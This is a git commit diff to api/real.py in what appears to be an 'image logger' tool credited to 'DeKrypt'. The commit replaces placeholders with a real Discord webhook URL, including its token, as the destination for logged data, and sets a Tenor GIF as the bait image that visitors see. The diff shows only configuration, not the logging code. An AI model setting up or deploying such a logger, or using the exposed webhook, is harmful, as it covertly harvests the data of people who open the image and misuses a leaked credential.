b7af67fb606028d5acf32ab172afea34877c614e
Twavl <jaycer0528@gmail.com>
2025-02-01 02:53:27 -0200

    Update real.py

--- api/real.py
+++ api/real.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1304685861216063520/z-MldR9_q58OeazlY1lIaFEA3gbSsbyXgfQHIMeDTreCcNP-Plio5EvqpesAoxQHV6W3",
+    "image": "https://tenor.com/view/parse-black-man-eggs-gif-24198059", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
